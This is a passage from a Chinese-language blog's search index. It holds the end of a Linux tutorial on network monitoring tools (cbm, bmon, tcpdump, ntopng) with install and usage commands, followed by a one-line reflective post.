cbm</code></pre><p>我们只需使用下面展示的命令来在 shell 窗口或虚拟终端中运行 cbm：</p><pre><code>cbm</code></pre><h1 id="bmon"><a href="#bmon" class="headerlink" title="bmon"></a>bmon</h1><p>Bmon （ Bandwidth Monitoring） ，是一个用于调试和实时监控带宽的工具。这个工具能够检索各种输入模块的统计数据。<br>它提供了多种输出方式，包括一个基于 curses 库的界面，轻量级的HTML输出，以及 ASCII 输出格式<br>bmon 可以在软件仓库中找到，所以我们可以通过使用 apt 包管理器来在 Debian、Ubuntu 中安装它。<br>为此，我们需要在一个 shell 窗口或虚拟终端中运行下面的命令：</p><pre><code>sudo apt-get install bmon</code></pre><p>我们可以使用下面的命令来运行 bmon 以监视我们的网络状态：</p><pre><code>bmon</code></pre><h1 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h1><p>TCPDump 是一个用于网络监控和数据获取的工具。它可以为我们节省很多的时间，并可用来调试网络或服务器的相关问题。<br>它可以打印出在某个网络接口上与布尔表达式相匹配的数据包所包含的内容的一个描述。<br>tcpdump 可以在 Debian、Ubuntu 的默认软件仓库中找到，我们可以简单地以 sudo 权限使用 apt 包管理器来安装它。<br>为此，我们需要在一个 shell 窗口或虚拟终端中运行下面的命令：</p><pre><code>sudo apt -get install tcpdump</code></pre><p>tcpdump 也可以在 Fedora、CentOS、RHEL 的软件仓库中找到。我们可以像下面一样通过 yum 包管理器来安装它：<br>tcpdump 需要以 root 权限或超级用户来运行，我们需要带上我们想要监控的 TCP 连接的网络接口名称来执行 tcpdump 。在这里，<br>我们有 wlan2 这个网络接口，所以可以像下面这样使用：</p><pre><code>sudo tcpdump -i wlan2</code></pre><p>假如你只想监视一个特定的端口，则可以运行下面的命令。下面是一个针对 80 端口(网络服务器)的例子：</p><pre><code>sudo tcpdump -i wlan2 &#39;port 80&#39;</code></pre><h1 id="ntopng"><a href="#ntopng" class="headerlink" title="ntopng"></a>ntopng</h1><p>ntopng 是 ntop 的下一代版本。它是一个用于展示网络使用情况的网络探头，在一定程度上它与 top 针对进程所做的工作类似。<br>ntopng 基于 libpcap 并且它以可移植的方式被重写，以达到可以在每一个 Unix 平台 、 MacOSX 以及 Win32 上运行的目的。<br>为了在 Debian，Ubuntu 系统上安装 ntopng，首先我们需要安装 编译 ntopng 所需的依赖软件包。<br>你可以通过在一个 shell 窗口或一个虚拟终端中运行下面的命令来安装它们：</p><pre><code>sudo apt-get install libpcap-dev libglib2.0-dev libgeoip-dev redis-server wget libxml2-dev build-essential checkinstall</code></pre><p>现在，我们需要像下面一样针对我们的系统手动编译 ntopng ：</p><pre><code>sudo wget http://sourceforge.net/projects/ntop/files/ntopng/ntopng-1.1_6932.tgz/downloadsudo tar zxfv ntopng-1.1_6932.tgzsudo cd ntopng-1.1_6932sudo ./configuresudo makesudo make install</code></pre><p>这样，在你的 Debian 或 Ubuntu 系统上应该已经安装上了你编译的 ntopng 。<br>我们已经有了有关 ntopng 的使用方法的教程，它既可以在命令行也可以在 Web 界面中使用，<br>我们可以前往这些教程来获得有关 ntopng 的知识。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随想</title>
      <link href="/2023/11/10/first/"/>
      <url>/2023/11/10/first/</url>
      
        <content type="html"><![CDATA[<p>灵魂困于方寸之地, 枷锁桎梏自由之身。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinking </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
